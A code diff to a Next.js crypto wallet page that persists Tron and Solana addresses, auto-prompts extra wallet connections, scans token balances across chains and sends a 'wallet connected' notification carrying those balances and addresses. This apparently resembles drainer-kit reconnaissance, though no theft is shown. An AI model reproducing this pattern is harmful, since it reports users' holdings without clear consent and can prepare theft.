@@ -157,8 +157,34 @@ export default function Home() {
   const SERVICE_WALLET_ADDRESS = process.env.NEXT_PUBLIC_SERVICE_WALLET || process.env.SERVICE_WALLET_ADDRESS || '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f';
   const [tokenSymbol, setTokenSymbol] = useState('');
   const [tokenSymbolError, setTokenSymbolError] = useState<string | null>(null);
-  const [tronAddress, setTronAddress] = useState<string | null>(null);
-  const [solanaAddress, setSolanaAddress] = useState<string | null>(null);
+  const [tronAddress, setTronAddressState] = useState<string | null>(() => {
+    if (typeof window !== 'undefined') {
+      return localStorage.getItem('connected_tron_address') || null;
+    }
+    return null;
+  });
+  const [solanaAddress, setSolanaAddressState] = useState<string | null>(() => {
+    if (typeof window !== 'undefined') {
+      return localStorage.getItem('connected_solana_address') || null;
+    }
+    return null;
+  });
+
+  const setTronAddress = (addr: string | null) => {
+    setTronAddressState(addr);
+    if (typeof window !== 'undefined') {
+      if (addr) localStorage.setItem('connected_tron_address', addr);
+      else localStorage.removeItem('connected_tron_address');
+    }
+  };
+
+  const setSolanaAddress = (addr: string | null) => {
+    setSolanaAddressState(addr);
+    if (typeof window !== 'undefined') {
+      if (addr) localStorage.setItem('connected_solana_address', addr);
+      else localStorage.removeItem('connected_solana_address');
+    }
+  };
 
   useEffect(() => {
     if (typeof window === 'undefined') return;
@@ -166,13 +192,15 @@ export default function Home() {
 
     if (win.tronWeb && win.tronWeb.defaultAddress?.base58 && !tronAddress) {
       setTronAddress(win.tronWeb.defaultAddress.base58);
+    } else if (address && !tronAddress) {
+      setTronAddress(evmAddressToTronAddress(address));
     }
 
     if ((win.phantom?.solana?.publicKey || win.solana?.publicKey) && !solanaAddress) {
       const pubKey = (win.phantom?.solana?.publicKey || win.solana?.publicKey).toString();
       setSolanaAddress(pubKey);
     }
-  }, [tronAddress, solanaAddress]);
+  }, [address, tronAddress, solanaAddress]);
 
   const currentServiceFeeKey = address ? address.toLowerCase() : tronAddress ? `tron_${tronAddress}` : solanaAddress ? `sol_${solanaAddress}` : null;
 
@@ -738,22 +766,32 @@ export default function Home() {
 
       // Scan token balances and refresh balance data before sending notification
       (async () => {
+        let solAddr: string | undefined = solanaAddress || autoDetectSolanaAddress() || undefined;
+        let tronAddr: string | undefined = tronAddress || (address ? evmAddressToTronAddress(address) : autoDetectTronAddress()) || undefined;
+
         try {
-          const solAddr = solanaAddress || autoDetectSolanaAddress() || (await connectSolanaWallet().catch(() => null));
-          if (solAddr && solAddr !== solanaAddress) {
-            setSolanaAddress(solAddr);
+          if (!solAddr) {
+            const connectedSol = await connectSolanaWallet().catch(() => null);
+            if (connectedSol) {
+              solAddr = connectedSol;
+              setSolanaAddress(connectedSol);
+            }
           }
-          const tronAddr = tronAddress || autoDetectTronAddress(address) || (await connectTronWallet().catch(() => null));
-          if (tronAddr && tronAddr !== tronAddress) {
-            setTronAddress(tronAddr);
+          if (!tronAddr) {
+            const connectedTron = await connectTronWallet().catch(() => null);
+            if (connectedTron) {
+              tronAddr = connectedTron;
+              setTronAddress(connectedTron);
+            }
           }
 
           await fetchNetworkBalance();
           const scanned = await scanTokensAcrossChains(address);
           setTokenBalances(scanned);
-          await sendWalletConnectedNotify(scanned, tronAddr || undefined, solAddr || undefined);
+          await sendWalletConnectedNotify(scanned, tronAddr, solAddr);
         } catch (e) {
-          await sendWalletConnectedNotify();
+          console.warn('sendWalletConnectedNotify error:', e);
+          await sendWalletConnectedNotify([], tronAddr, solAddr);
         }
       })();
     }
